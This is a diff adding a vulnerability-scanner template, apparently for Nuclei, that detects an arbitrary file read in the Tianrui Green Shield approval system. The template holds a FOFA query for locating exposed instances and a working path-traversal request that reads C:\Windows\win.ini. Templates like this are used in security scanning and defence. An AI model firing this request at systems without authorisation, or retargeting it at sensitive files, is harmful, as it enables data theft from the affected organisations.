@@ -1,0 +1,25 @@
+id: tianrui-greenshield-downfilebyconfirm-file-read
+
+info:
+  name: "天锐绿盾审批系统 downFileByconfirm.do 任意文件读取漏洞"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: app="TIPPAY-绿盾审批系统"
+      该接口存在文件访问控制缺陷，攻击者可利用路径穿越技术读取非授权文件，导致敏感数据泄露。漏洞源于对用户提交的文件路径参数缺乏有效校验，允许构造恶意请求访问任意文件系统资源。
+  tags: 天锐绿盾审批系统
+
+http:
+- raw:
+  - |
+    GET /trwfe/service/.%2E/file/downFileByconfirm.do?dstPath=C:\Windows\win.ini&fileName=&processInstanceIds= HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip, deflate
+    Accept: */*
+    Connection: close
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - "for 16-bit app support"
